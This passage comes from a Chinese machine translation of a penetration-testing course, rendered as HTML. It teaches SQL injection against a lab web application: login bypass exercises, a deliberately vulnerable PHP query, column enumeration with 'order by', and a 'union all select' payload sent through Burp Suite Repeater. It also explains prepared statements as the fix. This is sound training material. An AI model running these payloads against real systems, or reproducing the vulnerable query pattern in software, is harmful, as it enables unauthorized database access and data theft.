<div style="position:absolute;top:7581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在黑盒测试中很重要。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:7643;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们如何防止 SQL 注入？</font><font style="vertical-align: inherit;">一种天真的方法可能是删除所有</font></font></i></nobr></div>
<div style="position:absolute;top:7662;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清理用户输入时的单引号字符。</font><font style="vertical-align: inherit;">然而，也有这样的时候</font></font></i></nobr></div>
<div style="position:absolute;top:7681;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单引号应被视为有效输入，例如姓氏。</font></font></i></nobr></div>
<div style="position:absolute;top:7728;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最好的方法是使用参数化查询，也称为准备</font></font></i></nobr></div>
<div style="position:absolute;top:7747;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">声明。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">287</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此功能允许开发人员将参数或</font></font></i></nobr></div>
<div style="position:absolute;top:7766;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">占位符插入到他们的 SQL 语句中。</font><font style="vertical-align: inherit;">然后将用户输入与</font></font></i></nobr></div>
<div style="position:absolute;top:7786;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句和数据库将值绑定到语句，创建一个</font></font></i></nobr></div>
<div style="position:absolute;top:7805;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL 语句代码和数据值之间的分离层。</font><font style="vertical-align: inherit;">这</font></font></i></nobr></div>
<div style="position:absolute;top:7824;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防止用户提供的数据操纵 SQL 代码。</font><font style="vertical-align: inherit;">最主要的</font></font></i></nobr></div>
<div style="position:absolute;top:7844;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库系统和编程语言支持准备好的语句。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:7906;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.4 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 与 MariaDB 数据库交互，手动执行所需的命令</font></font></nobr></div>
<div style="position:absolute;top:7955;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对应用程序进行身份验证。</font><font style="vertical-align: inherit;">了解漏洞。</font></font></nobr></div>
<div style="position:absolute;top:7984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. SQL注入用户名字段绕过登录过程。</font></font></nobr></div>
<div style="position:absolute;top:8012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 为什么认证后用户名和web应用一样显示</font></font></nobr></div>
<div style="position:absolute;top:8031;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程被绕过？</font></font></nobr></div>
<div style="position:absolute;top:8060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.在密码字段中执行SQL注入。</font><font style="vertical-align: inherit;">有效载荷中是否需要“LIMIT 1”？</font></font></nobr></div>
<div style="position:absolute;top:8079;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为什么或者为什么不？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:8113;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.5 枚举数据库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用 SQL 注入攻击来枚举数据库。</font><font style="vertical-align: inherit;">我们将需要这些信息</font></font></nobr></div>
<div style="position:absolute;top:8167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着我们开始构建更复杂的 SQL 注入负载。</font><font style="vertical-align: inherit;">例如，我们需要知道</font></font></nobr></div>
<div style="position:absolute;top:8186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列名和表名，如果我们要从中提取数据。</font><font style="vertical-align: inherit;">这有助于我们执行更多</font></font></nobr></div>
<div style="position:absolute;top:8206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手术数据提取。</font></font></nobr></div>
<div style="position:absolute;top:8239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们研究一些从应用程序中检索此信息的技术。</font></font></nobr></div>
<div style="position:absolute;top:8271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们之前的登录表单不适合演示这一点，所以我们将转向 debug.php，它</font></font></nobr></div>
<div style="position:absolute;top:8291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还包含一个 SQL 注入漏洞，如下代码所示：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:8363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">287 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Prepared_statement</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:8491;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="8"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 8 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:8524;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:9601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:9601;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:9601;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">328</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sql = "SELECT id, name, text FROM feedback WHERE id=". </font><font style="vertical-align: inherit;">$_GET['id'];</font></font></nobr></div>
<div style="position:absolute;top:8641;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 324 - 来自调试页面的 SQL 查询</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过添加单引号作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">的值来测试此页面是否存在漏洞</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8897;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 162：另一个 SQL 错误消息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这会导致 SQL 语法错误，表明存在潜在的 SQL 注入漏洞。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:8962;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.6 列号枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">在查询中</font><font style="vertical-align: inherit;">添加一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">order by</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子句以进行简单枚举。</font><font style="vertical-align: inherit;">这个子句告诉数据库</font></font></nobr></div>
<div style="position:absolute;top:9016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按一列或多列中的值对查询结果进行排序。</font><font style="vertical-align: inherit;">我们可以使用列名</font></font></nobr></div>
<div style="position:absolute;top:9035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或查询中的列索引。</font></font></nobr></div>
<div style="position:absolute;top:9068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们提交以下网址：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按 1 排序</font></font></font></b></nobr></div>
<div style="position:absolute;top:9122;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 325 - 附加“order by”语句</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此查询指示数据库根据第一列中的值对结果进行排序。</font><font style="vertical-align: inherit;">如果有</font></font></nobr></div>
<div style="position:absolute;top:9171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至少是查询中的一列，则查询有效并且页面将正确呈现。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:9190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以提交多个查询，</font><font style="vertical-align: inherit;">每次</font><font style="vertical-align: inherit;">递增</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">order by</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子句，直到查询生成</font></font></nobr></div>
<div style="position:absolute;top:9210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个错误，表明有问题的查询返回的最大列数有</font></font></nobr></div>
<div style="position:absolute;top:9229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被超过了。</font><font style="vertical-align: inherit;">请记住，查询可以选择表中的所有列或仅选择表中的一个子集</font></font></nobr></div>
<div style="position:absolute;top:9248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列。</font><font style="vertical-align: inherit;">如果我们无法访问源代码，我们需要依靠这种反复试验的方法</font></font></nobr></div>
<div style="position:absolute;top:9268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">询问。</font></font></nobr></div>
<div style="position:absolute;top:9301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们需要迭代列号任意次数，我们应该自动化</font></font></nobr></div>
<div style="position:absolute;top:9320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Burp Suite 的 Repeater 工具查询。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:9679;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="9"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 9 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9712;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:10789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:10789;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:10789;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">329</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:9802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.6.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们必须首先启动 Burp Suite，关闭拦截并启动针对我们的 URL</font></font></nobr></div>
<div style="position:absolute;top:9842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 目标。</font><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP history 中，</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们应该看到我们想要重复的请求：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10347;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 163：在 Burp Suite 中查看 HTTP 历史记录 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:10867;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="10"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 10 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:10900;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:11977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:11977;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:11977;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">330</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:10990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.6.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将右键单击请求并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Send to Repeater</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">请求现在应该显示</font></font></nobr></div>
<div style="position:absolute;top:11030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中继器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡下。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:11535;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 164：在中继器中查看请求 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:12055;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="11"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 11 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12088;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:13165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:13165;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:13165;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">331</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:12178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.6.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，该请求已进行 URL 编码并显示为“id=1%20order%20by%201”。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:12218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不应该影响我们的查询。</font><font style="vertical-align: inherit;">我们可以点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提交查询：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12723;left:382"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 165：使用中继器 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:13243;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="12"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13276;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:14353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:14353;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:14353;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">332</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:13366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.6.4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反应看起来很正常。</font><font style="vertical-align: inherit;">我们可以使用</font><font style="vertical-align: inherit;">Response 窗格下</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框来搜索</font></font></nobr></div>
<div style="position:absolute;top:13406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“错误”并验证响应正文中没有匹配项：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13911;left:377"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 166：中继器结果 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:14431;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="13"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 13 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:14464;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:15541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:15541;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:15541;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">333</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:14554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.6.5</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以增加</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">order_by</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子句并再次发送查询，直到收到错误</font></font></nobr></div>
<div style="position:absolute;top:14594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息。</font><font style="vertical-align: inherit;">我们可以使用“</font><font style="vertical-align: inherit;">响应”窗格下</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框来突出显示</font></font></nobr></div>
<div style="position:absolute;top:14613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回复：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:15119;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 167：使用 Burp Suite 中的搜索字段</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">order by</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子句在第四次迭代时产生了错误，我们知道查询返回</font></font></nobr></div>
<div style="position:absolute;top:15169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含三列的结果集。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:15203;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.7 理解输出的布局</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们知道表中有多少列，我们可以使用这些信息来提取</font></font></nobr></div>
<div style="position:absolute;top:15257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UNION</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句的</font><font style="vertical-align: inherit;">更多数据</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">联合允许我们添加第二个 select 语句到</font></font></nobr></div>
<div style="position:absolute;top:15277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始查询，扩展了我们的能力，但每个选择语句必须返回相同数量的</font></font></nobr></div>
<div style="position:absolute;top:15296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列。</font></font></nobr></div>
<div style="position:absolute;top:15329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们知道查询根据我们的枚举选择了三列。</font><font style="vertical-align: inherit;">但是，只有两列</font></font></nobr></div>
<div style="position:absolute;top:15348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示在网页上。</font><font style="vertical-align: inherit;">我们的下一步是确定显示哪些列。</font><font style="vertical-align: inherit;">要是我们</font></font></nobr></div>
<div style="position:absolute;top:15367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用联合来提取有用的数据，我们要确保数据将被显示。</font></font></nobr></div>
<div style="position:absolute;top:15400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要更好地理解我们的输出，以便我们可以开始构建一个有意义的数据库</font></font></nobr></div>
<div style="position:absolute;top:15419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">萃取。</font><font style="vertical-align: inherit;">首先，让我们了解一下页面中正在显示哪些列。</font><font style="vertical-align: inherit;">我们将使用一个</font></font></nobr></div>
<div style="position:absolute;top:15439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UNION 来做到这一点。</font><font style="vertical-align: inherit;">我们可以指定文字值而不是从表中查找值。</font><font style="vertical-align: inherit;">因为我们</font></font></nobr></div>
<div style="position:absolute;top:15458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有三列，我们将在我们的有效载荷中添加“union all select 1,2,3”。</font><font style="vertical-align: inherit;">这个新的选择状态将</font></font></nobr></div>
<div style="position:absolute;top:15477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回一行三列，值为 1、2 和 3。我们的负载现在是这样的： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:15619;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="14"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15652;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:16729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:16729;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:16729;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">334</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:15750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/debug.php?id=1 </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">union all select 1, 2, 3</font></font></font></b></nobr></div>
<div style="position:absolute;top:15769;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 326 - 更新我们的有效负载以使用联合</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页面显示不同列的位置如下图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:16016;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 168：查看 Union Payload 的结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到第一列没有显示，第二列显示在名称字段中，列</font></font></nobr></div>
<div style="position:absolute;top:16066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">三显示在注释字段中。</font><font style="vertical-align: inherit;">评论字段有更多空间，所以这是一个合乎逻辑的位置</font></font></nobr></div>
<div style="position:absolute;top:16085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于我们未来漏洞利用的输出。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
